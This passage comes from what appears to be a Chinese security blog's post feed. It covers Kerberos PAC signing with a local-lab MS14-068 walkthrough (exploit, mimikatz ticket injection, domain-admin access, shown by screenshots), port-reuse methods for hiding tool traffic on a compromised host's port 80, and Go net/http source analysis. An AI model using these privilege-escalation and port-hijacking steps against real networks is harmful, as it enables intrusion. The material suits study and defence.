那么在一个域中，如何才能知道某个域用户所拥有的权限呢？自然是需要提供User的SID和所在组Group的SID。必须了解的一个前提是，KDC、A和B三者中，B只信任KDC所提供的关于A到底是什么权限，所以在一个域初始时，KDC上拥有A和B的权限。现在需要解决的是，KDC必须告诉B关于A的权限，这样B验证A的权限后才能决定让不让A访问自身的网络资源。</p><p>  为了最终使得Server-B能知道Client-A所具有的权限，微软在KRB_AS_REP中的TGT中增加了Client-A的PAC（特权属性证书），也就是Client-A的权限，包括Client-A的User的SID、Group的SID：</p><p>  图片如下：</p><p>  <img src="/image/Kerberos/PAC.png" alt="image"></p><p>  可以看到被KDC加密的TGT中，不仅包括了被加密的SessionKeya-kdc，还包括KRB_AS_REQ中申请者（Client-A）的权限属性证书，为了防止该特权证书被篡改（即使被KDC加密，Client-A无法轻易解密，但谁也无法保证绝对的安全），在PAC的尾部增加了两个校验Server Signature和KDC Signature：</p><p>  这两个校验一个是Server Signature，另一个是KDC Signature，对于Client-A与AS服务来说，Server代表的是TGS服务，KDC代表的是AS服务（AS作为Client-A与TGS的第三方信任机构），而AS服务与TGS服务具有相同的krgtgt账号，所以这两个校验都是krgtgt账号的密码生成的，当然，整个TGT也是用KDC的密码也就是krgtgt账号密码加密的，它们三者不同的是，用的算法和加密内容有所不同。</p><p>  微软是这样打算的，无论如何也要把PAC从KDC传送到Server-B，为了在Kerberos认证过程中实现，微软选择了如下做法：</p><p>  将PAC放在TGT中加密后从AS服务经Client-A中转给TGS服务，再放在由TGS服务返回的ServiceTicket中加密后经Client-A中转给Server-B</p><p>  <img src="/image/Kerberos/ServiceTicket.png" alt="image"></p><p>  需要注意的是，在KRB_TGS_REQ阶段，携带PAC的TGT被TGS服务接收后，认证A的合法性后（解密Authenticator符合要求）会将PAC解密出来，验证尾部两个签名的合法性，如果合法则认为PAC没有被篡改，于是重新在PAC的尾部更换了另外两个签名，一个是Server Signature，这次是以Server-B的密码副本生成的签名（因为对于Client-A和Server-B，这次的第三方机构是TGS服务），另外一个仍旧是KDC Signature，两者合在一起，最终成为New Signed PAC被拷贝在ServericeTicket中被加密起来。</p><p><strong>注意，这里再次签发的PAC尾部的签名一个基于是B的密码hash一个仍然是基于KDC的密码hash（krgtgt用户的密码hash），在B端可以选择是否认证这个PAC的KDC签名，如果选择不认证，就不对PAC进行签名校验（也可能只校验基于B的密码hash的签名，这一点不太确定），并且之后也只是在解密PAC后直接根据用户权限来决定是否允许客户端访问相对应的资源，但是如果选择认证，B将会把PAC中的签名传递给DC来进行检验，只有DC确认签名有效后B才会根据用户权限来决定是否允许客户端访问相对应的资源，如下图所示,图片来自微软官方<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84">巨硬</a></strong></p><p> <img src="/image/Kerberos/Check_PAC.png" alt="check"></p><p><strong>当然，有的服务器并不校验KDC签名，校验与否决定了银票是否能够正常被使用（银票下一篇文章会讲）</strong></p><p>  最终绕过来绕过去，KDC上所拥有的关于Client-A的权限证书PAC终于发给了Server-B，Server-B在对Client-A进行认证的同时，同时也能判断Client-A有没有访问网络资源的权限。</p><h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>  这里我发现的一个大师傅分析的很不错，受教了</p><p>  <a href="/archives/Kerberos/MS14-068.html">详细</a></p><p>  可以继续好好消化</p><h2 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h2><p>  我自己在本地搭建了一下环境</p><p>  域控是win2008，域用户端是win7</p><p>  首先先看一下没有工具之前，我使用net use尝试挂载域控的c盘是无效的，需要输入用户名密码</p><p>  <img src="/image/Kerberos/init.jpg" alt="init"></p><p>  可以看到是无效的</p><p>  这是这个时候缓存的票据信息：</p><p>  <img src="/image/Kerberos/beforeinject.jpg" alt="before"></p><p>  此时，执行exploit</p><p>  <img src="/image/Kerberos/attack.jpg" alt="attack"></p><p>  将获得的TGT用mimikatz注入内存</p><p>  <img src="/image/Kerberos/inject.jpg" alt="inject"></p><p>  此时的缓存票据信息：</p><p>  <img src="/image/Kerberos/afterinject.jpg" alt="after"></p><p>  可以看见第一个票据被改变了（原来的第一个票据被移到第二个，看清标志），这就是我们的新TGT</p><p>  接着再尝试挂载域控的c盘：</p><p>  <img src="/image/Kerberos/barren.jpg" alt="nah"></p><p>  可以看见无效，这是因为，这时我们注入的是TGT，而我们实际上在登陆的时候就有了一张初始权限的ServiceTicket（可以看第三个票据，cifs/domain.test的那一个)，这是我们挂载时用到的ServiceTicket。也就是说其实系统会先检查内存中有没有相关服务的ServiceTicket，如果有就直接使用，如果没有，那么才会使用TGT去换ServiceTicket，故而这里我们虽然注入了高权限的TGT，系统却并没有用它来换ServiceTicket，而是用了之前的，故而还是无效的。</p><p>  这时我们清空票据缓存</p><p>  <img src="/image/Kerberos/purge.jpg" alt="purge"></p><p>  重新注入票据后：</p><p>  <img src="/image/Kerberos/inject_twice.jpg" alt="again"></p><p>  可以看见只有一张我们注入的TGT了</p><p>  重新尝试挂载：</p><p>  <img src="/image/Kerberos/success.jpg" alt="success"></p><p>  可以看见已经不需要用户名密码了</p><p>  再看看票据缓存：</p><p>  <img src="/image/Kerberos/final.jpg" alt="final"></p><p>  可以发现，系统使用我们注入的高权限TGT重新申请了高权限的ServiceTicket，从而完成了攻击，在票据到期前，攻击者拥有域内最高的权限</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>  虽然是好几年前的漏洞了，但是对于理解Kerberos协议的工作原理还是有着很大的帮助</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口复用的一些tricks</title>
      <link href="Port-reuse.html"/>
      <url>Port-reuse.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为了叙述方便，本文假设我们控制了一台主机，其80端口之上运行着apache服务，而我们需要复用80端口</p><h1 id="利用IPtables"><a href="#利用IPtables" class="headerlink" title="利用IPtables"></a>利用IPtables</h1><p>  首先第一种方法我是参考了网上的一篇<a href="/archives/Portreuse.htm">文章</a>，主要是利用IPtables规则来实现端口复用。</p><p>  实际上这个方法属于伪端口复用，因为实际上我们的程序并不会复用同样的端口，而是利用IPtables会在路由决策之前生效的特性，将我们的程序监听在本地的另一个端口上（比方说8888），将外部流量全部导向我们自己的程序，再由我们自己的程序进行流量的分发（通过识别流量特征区分工具流量和正常http流量）</p><p>  那么这个方法实际上确实效果还不错，不会影响到正常服务器的运行，而且在严格受限的环境当中（即只允许80端口的出入站连接），确实可以完成既定目标</p><p>  但是，这个方法的局限性也比较明显，那就是需要完成这个操作需要有root权限（废话。。。），并且仅支持linux服务器，而且会监听额外的端口。root权限虽然说不是每次都搞不到，但是也算是一个受限的点，毕竟我们无法保证能否在一些受限严格的边缘服务器上搞到root权限。</p><p>  总的来说，在有root权限的情况下，是个不错的方式。</p><h1 id="利用SO-REUSEADDR和SO-REUSEPORT"><a href="#利用SO-REUSEADDR和SO-REUSEPORT" class="headerlink" title="利用SO_REUSEADDR和SO_REUSEPORT"></a>利用SO_REUSEADDR和SO_REUSEPORT</h1><p>  其实这个方法也是由来已久，也是大家在设置socket的时候常常忽略的黑魔法。</p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>  在windows上复用端口时，我们主要是利用了SO_REUSEADDR这个选项，这个选项一方面将允许两个进程监听相同端口，只需要ip地址不完全相同即可，打个比方，绝大多数web服务器默认监听在0.0.0.0上，所以我们的程序可以监听在192.168.x.x的ip上，并且监听同一个端口（因为通配符0.0.0.0和具体的ip地址192.168.x.x不是“同一个”ip地址），这样就可以劫持端口流量（因为在路由决策时，是最大匹配原则，当用户在外网访问服务器上的web页面时，会输入具体的ip地址192.168.x.x，这样的话在路由决策时，所有应当流向web服务器的流量将会被我们劫持，而我们只需要分发流量就可以成功完成复用）</p><p>  另一方面，在windows上SO_REUSEADD也同样具有SO_REUSEPORT（下面会讲到）的作用，也就是说只要在windows上设置了SO_REUSEADDR，同样也支持完全相同的ip：port对的监听。</p><p>  在windows上还有一个特性，也就是如果已经监听的进程是由管理员启动的，并且监听在了0.0.0.0：80上，那么此时设置了SO_REUSEADDR选项的，同样是由管理员启动的第二个进程，将可以实现127.0.0.1:80，0.0.0.0:80，192.168.x.x：80的复用，但如果第二个进程（设置了SO_REUSEADDR）是由普通用户设置的，那么将无法监听0.0.0.0:80，只能监听192.168.x.x：80 以及127.0.0.1:80.而如果反过来，第一个进程由普通用户启动，那么，不管第二个进程（设置了SO_REUSEADDR）是由管理员或者是普通用户启动，都可以实现0.0.0.0：80，127.0.0.1:80，192.168.x.x：80的监听</p><p>  值得一提的是，在windows上启动一个新的设置了SO_REUSEADDR选项的进程时是不会校验之前已经监听在相同端口上的程序是否同样启用了该选项的，只要新进程设置即可，但这也导致端口劫持的风险，所以微软在windows中又加入了一个特殊的选项SO_EXCLUCIVEADDRUSE，只要之前监听的程序设置此选项，那么之后再有进程想要监听同样的端口，将会被直接拒绝，防止端口劫持的发生</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>  在linux上，包含了SO_REUSEADDR以及SO_REUSEPORT两个选项。</p><p>  SO_REUSEADDR本身这个选项将允许两个进程监听相同端口，只需要ip地址不完全相同即可;但是在linux上有着特殊情况，此特殊情况导致了linux对于SO_REUSEADDR这个选项的实现和BSD及mac有很大区别，比如在linux上一个程序如果监听了通配符地址，那么就算后面的进程设置了SO_REUSEADDR，它也不能监听192.168.x.x或者127.0.0.1（在相同端口的情况下），反过来也一样（监听了127.0.0.1:80，就不能监听0.0.0.0:80，即通配符地址与所有地址互斥），而这在BSD及mac中这种情况是被允许的。</p><p>  讲一下SO_REUSEPORT，这个选项在在linux是可用的，在windows上并没有这个设置，它的出现是旨在进一步实现负<br>载均衡，可以让两个不同的进程同时监听在完全一致的ip：port组合上，从而实现端口复用</p><p>  一旦监听端口的前一个进程启用了SO_REUSEPORT，那么只要第二个启动的进程也启用SO_REUSEPORT选项，就可以实现完全相同的ip：port复用，此时发送到此端口的syn请求将被内核尝试平均分配，即两个进程将都会有机会获得外部的请求。</p><p>  但是，linux上的许多web程序或者其他功能程序默认情况下不会设置SO_REUSEPORT选项，故而很难用SO_REUSEADDR和SO_REUSEPORT来复用linux端口，需要另辟蹊径。</p><p>  PS：如果在启用了SO_REUSEPORT的情况下同时启用了SO_REUSEADDR（不确定SO_REUSEADDR是否需要启用，但是我们一般如果需要端口复用，都会将两者同时启用，在这边呢根据SO_REUSEADDR的功能描述，我更倾向与linux上将原本SO_REUSEADDR应该有的功能（使得通配符与特定地址监听不冲突）“锁住”了，只有当两个选项同时启用的时候，SO_REUSEADDR的原本功能才会“解锁”，重新恢复其原来应该具有的功能。所以我偏向于SO_REUSEADDR需要同时启用），那么SO_REUSEADDR将恢复原来应该有的功能，即哪怕前一个进程（同时启用了SO_REUSEADDR和SO_REUSEPORT）监听在0.0.0.0:80上，第二个进程（同样启用两个选项）也可以监听在192.168.x.x：80上，通配符地址不再与特定地址冲突。</p><p>  此外，在linux上还有一个限制，就是当前一个进程启用了SO_REUSEPORT时，第二个启动的进程必须与第一个启动的进程具有相同的用户id，不然哪怕第二个进程也启用了SO_REUSEPORT选项，同样无法复用端口。</p><h2 id="BSD及MAC"><a href="#BSD及MAC" class="headerlink" title="BSD及MAC"></a>BSD及MAC</h2><p>  由于MAC及BSD在此功能上的实现是一样的，故只拿mac举例了</p><p>  在mac上，与linux一样，包含了SO_REUSEADDR以及SO_REUSEPORT两个选项</p><p>  与linux的不同之处就在于，在单独启用SO_REUSEADDR选项时，通配符地址不与特定地址冲突，也就是说与linux上监听了0.0.0.0就不能监听192.168.x.x不同，只要两个进程都启用SO_REUSEADDR，这种监听就是可以成立的。</p><p>  而如果两个进程同时启用了SO_REUSEADDR以及SO_REUSEPORT，那么除了可以实现SO_REUSEADDR自身功能（允许两个进程监听相同端口，只需要ip地址不完全相同）以外，完全监听相同的ip：port选项也是被允许的</p><h2 id="数据包流向"><a href="#数据包流向" class="headerlink" title="数据包流向"></a>数据包流向</h2><p>  刚才说了那么多情况，有一个问题还没有解决，那就是如果两个功能完全不同的进程监听在完全相同的ip：port上，那么流量应当给谁呢？</p><p>  实际上这也要分情况讨论：</p><ul><li><p>在windows上，如果两个进程同时监听在完全相同的ip：port上，那么遵守先来先得的规则，外部请求只会被第一个监听在此ip：port的socket所接收，第二个socket将完全无法收到外部的请求</p></li><li><p>在linux上，同样情况下，由于linux内核对此的实现是尝试将外部请求平均分配，实现负载均衡，所以两个进程均有近似相同的几率可以获得来自外部的请求</p></li><li><p>在BSD/MAC上，需要分两种情况，当监听的ip地址为通配符地址时，与windows相同，遵守先来先得的规则，外部请求只会被第一个监听在此ip：port的socket所接收，第二个socket将无法接收外部的请求，而当监听的地址为特定地址时，遵守后来先得的规则，外部请求只会被第二个监听在此ip：port的socket所接收，第一个socket将无法接收外部的请求</p></li></ul><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>  感觉在应用层上做端口复用效果不是很理想，要在内核层面上做才会有更好的效果</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go net/http包源码解析（一）</title>
      <link href="Go-source-code.html"/>
      <url>Go-source-code.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先来看看一个最常出错的地方，net/http包中，Response结构体Body的处理方法不当所导致的内存泄露问题</p><h1 id="为什么要Close？"><a href="#为什么要Close？" class="headerlink" title="为什么要Close？"></a>为什么要Close？</h1><p>  首先来看一段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line">&quot;io&#x2F;ioutil&quot;</span><br><span class="line">&quot;net&quot;</span><br><span class="line">&quot;net&#x2F;http&quot;</span><br><span class="line">&quot;time&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func PrintLocalDial(network, addr string) (net.Conn, error) &#123;</span><br><span class="line">dial :&#x3D; net.Dialer&#123;</span><br><span class="line">Timeout:   30 * time.Second,</span><br><span class="line">KeepAlive: 30 * time.Second,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">conn, err :&#x3D; dial.Dial(network, addr)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">return conn, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(&quot;connect done, use&quot;, conn.LocalAddr().String())</span><br><span class="line"></span><br><span class="line">return conn, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func doGet(client *http.Client, url string, id int) &#123;</span><br><span class="line">resp, err :&#x3D; client.Get(url)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; io.Copy(ioutil.Discard, resp.Body)</span><br><span class="line">&#x2F;&#x2F; fmt.Println(&quot;copy&quot;)</span><br><span class="line">buf, err :&#x3D; ioutil.ReadAll(resp.Body)</span><br><span class="line">fmt.Printf(&quot;%d: %s -- %v\n&quot;, id, string(buf[0:1]), err)</span><br><span class="line">if err :&#x3D; resp.Body.Close(); err &#x3D;&#x3D; nil &#123;</span><br><span class="line">fmt.Println(&quot;close&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">client :&#x3D; &amp;http.Client&#123;</span><br><span class="line">Transport: &amp;http.Transport&#123;</span><br><span class="line">Dial: PrintLocalDial,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line">const URL &#x3D; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;&quot;</span><br><span class="line"></span><br><span class="line">for &#123;</span><br><span class="line">go doGet(client, URL, 1)</span><br><span class="line">go doGet(client, URL, 2)</span><br><span class="line">time.Sleep(2 * time.Second)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  这段代码是标准的写法，首先发出Get请求，然后读Body中的数据，最后将Body用Close方法关闭</p><p>  相信有不少人在首次编写类似程序的时候，一定有人告诉过你，一定要注意将Body关闭，不然会导致内存泄露的问题,那么，事实是否真的是这样呢？</p><p>  我们来看看源码（Go 1.13）</p><p>  首先我们来看看Do方法，只挑重点的代码段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func (c *Client) Do(req *Request) (*Response, error) &#123;</span><br><span class="line">return c.do(req)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  可以看到直接调用了私有方法do，再看看这个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">func (c *Client) do(req *Request) (retres *Response, reterr error) &#123;</span><br><span class="line">if testHookClientDoResult !&#x3D; nil &#123;</span><br><span class="line">defer func() &#123; testHookClientDoResult(retres, reterr) &#125;()</span><br><span class="line">&#125;</span><br><span class="line">if req.URL &#x3D;&#x3D; nil &#123;</span><br><span class="line">req.closeBody()</span><br><span class="line">return nil, &amp;url.Error&#123;</span><br><span class="line">Op:  urlErrorOp(req.Method),</span><br><span class="line">Err: errors.New(&quot;http: nil Request.URL&quot;),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">deadline      &#x3D; c.deadline()</span><br><span class="line">reqs          []*Request</span><br><span class="line">resp          *Response</span><br><span class="line">copyHeaders   &#x3D; c.makeHeadersCopier(req)</span><br><span class="line">reqBodyClosed &#x3D; false &#x2F;&#x2F; have we closed the current req.Body?</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Redirect behavior:</span><br><span class="line">redirectMethod string</span><br><span class="line">includeBody    bool</span><br><span class="line">)</span><br><span class="line">uerr :&#x3D; func(err error) error &#123;</span><br><span class="line">&#x2F;&#x2F; the body may have been closed already by c.send()</span><br><span class="line">if !reqBodyClosed &#123;</span><br><span class="line">req.closeBody()</span><br><span class="line">&#125;</span><br><span class="line">var urlStr string</span><br><span class="line">if resp !&#x3D; nil &amp;&amp; resp.Request !&#x3D; nil &#123;</span><br><span class="line">urlStr &#x3D; stripPassword(resp.Request.URL)</span><br><span class="line">&#125; else &#123;</span><br><span class="line">urlStr &#x3D; stripPassword(req.URL)</span><br><span class="line">&#125;</span><br><span class="line">return &amp;url.Error&#123;</span><br><span class="line">Op:  urlErrorOp(reqs[0].Method),</span><br><span class="line">URL: urlStr,</span><br><span class="line">Err: err,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">for &#123;</span><br><span class="line">&#x2F;&#x2F; For all but the first request, create the next</span><br><span class="line">&#x2F;&#x2F; request hop and replace req.</span><br><span class="line">if len(reqs) &gt; 0 &#123;</span><br><span class="line">  &#x2F;&#x2F;省略了，不重要，看下面.......</span><br><span class="line">               &#125;</span><br><span class="line">&#x2F;&#x2F;重点</span><br><span class="line">reqs &#x3D; append(reqs, req)</span><br><span class="line">var err error</span><br><span class="line">var didTimeout func() bool</span><br><span class="line">&#x2F;&#x2F;重点是下面的send方法</span><br><span class="line">if resp, didTimeout, err &#x3D; c.send(req, deadline); err !&#x3D; nil &#123;</span><br><span class="line">&#x2F;&#x2F; c.send() always closes req.Body</span><br><span class="line">reqBodyClosed &#x3D; true</span><br><span class="line">if !deadline.IsZero() &amp;&amp; didTimeout() &#123;</span><br><span class="line">err &#x3D; &amp;httpError&#123;</span><br><span class="line">&#x2F;&#x2F; TODO: early in cycle: s&#x2F;Client.Timeout exceeded&#x2F;timeout or context cancellation&#x2F;</span><br><span class="line">      err:     err.Error() + &quot; (Client.Timeout exceeded while awaiting headers)&quot;,</span><br><span class="line">      timeout: true,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return nil, uerr(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var shouldRedirect bool</span><br><span class="line">redirectMethod, shouldRedirect, includeBody &#x3D; redirectBehavior(req.Method, resp, reqs[0])</span><br><span class="line">if !shouldRedirect &#123;</span><br><span class="line">return resp, nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req.closeBody()</span><br></pre></td></tr></table></figure><p>可以看到，在调用do方法时，首先会调用send方法，我们再来看看send方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; didTimeout is non-nil only if err !&#x3D; nil.</span><br><span class="line">func (c *Client) send(req *Request, deadline time.Time) (resp *Response, didTimeout func() bool, err error) &#123;</span><br><span class="line">if c.Jar !&#x3D; nil &#123;</span><br><span class="line">for _, cookie :&#x3D; range c.Jar.Cookies(req.URL) &#123;</span><br><span class="line">req.AddCookie(cookie)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;调用了send函数</span><br><span class="line">resp, didTimeout, err &#x3D; send(req, c.transport(), deadline)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">return nil, didTimeout, err</span><br><span class="line">&#125;</span><br><span class="line">if c.Jar !&#x3D; nil &#123;</span><br><span class="line">if rc :&#x3D; resp.Cookies(); len(rc) &gt; 0 &#123;</span><br><span class="line">c.Jar.SetCookies(req.URL, rc)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return resp, nil, nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又再次调用了send函数，继续：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">func send(ireq *Request, rt RoundTripper, deadline time.Time) (resp *Response, didTimeout func() bool, err error) &#123;</span><br><span class="line">req :&#x3D; ireq &#x2F;&#x2F; req is either the original request, or a modified fork</span><br><span class="line"></span><br><span class="line">if rt &#x3D;&#x3D; nil &#123;</span><br><span class="line">req.closeBody()</span><br><span class="line">return nil, alwaysFalse, errors.New(&quot;http: no Client.Transport or DefaultTransport&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;省略</span><br><span class="line">        &#x2F;&#x2F;重点</span><br><span class="line">stopTimer, didTimeout :&#x3D; setRequestCancel(req, rt, deadline)</span><br><span class="line">&#x2F;&#x2F;调用了rt的RoundTrip方法</span><br><span class="line">resp, err &#x3D; rt.RoundTrip(req)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">stopTimer()</span><br><span class="line">if resp !&#x3D; nil &#123;</span><br><span class="line">log.Printf(&quot;RoundTripper returned a response &amp; error; ignoring response&quot;)</span><br><span class="line">&#125;</span><br><span class="line">if tlsErr, ok :&#x3D; err.(tls.RecordHeaderError); ok &#123;</span><br><span class="line">&#x2F;&#x2F; If we get a bad TLS record header, check to see if the</span><br><span class="line">&#x2F;&#x2F; response looks like HTTP and give a more helpful error.</span><br><span class="line">&#x2F;&#x2F; See golang.org&#x2F;issue&#x2F;11111.</span><br><span class="line">if string(tlsErr.RecordHeader[:]) &#x3D;&#x3D; &quot;HTTP&#x2F;&quot; &#123;</span><br><span class="line">err &#x3D; errors.New(&quot;http: server gave HTTP response to HTTPS client&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return nil, didTimeout, err</span><br></pre></td></tr></table></figure><p>可以看到，send函数实际上调用了RoundTripper这个interface的RoundTrip方法，也就是上面c.transport()类型所实现的RoundTrip方法，那么c.transport()返回值是什么类型呢？来看看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">func (c *Client) transport() RoundTripper &#123;</span><br><span class="line">if c.Transport !&#x3D; nil &#123;</span><br><span class="line">return c.Transport</span><br><span class="line">&#125;</span><br><span class="line">return DefaultTransport</span><br><span class="line">&#125;</span><br><span class="line">var DefaultTransport RoundTripper &#x3D; &amp;Transport&#123;</span><br><span class="line">Proxy: ProxyFromEnvironment,</span><br><span class="line">DialContext: (&amp;net.Dialer&#123;</span><br><span class="line">Timeout:   30 * time.Second,</span><br><span class="line">KeepAlive: 30 * time.Second,</span><br><span class="line">DualStack: true,</span><br><span class="line">&#125;).DialContext,</span><br><span class="line">ForceAttemptHTTP2:     true,</span><br><span class="line">MaxIdleConns:          100,</span><br><span class="line">IdleConnTimeout:       90 * time.Second,</span><br><span class="line">TLSHandshakeTimeout:   10 * time.Second,</span><br><span class="line">ExpectContinueTimeout: 1 * time.Second,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现是Transport类型，那来看看Transport类型是如何实现RoundTrip方法的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 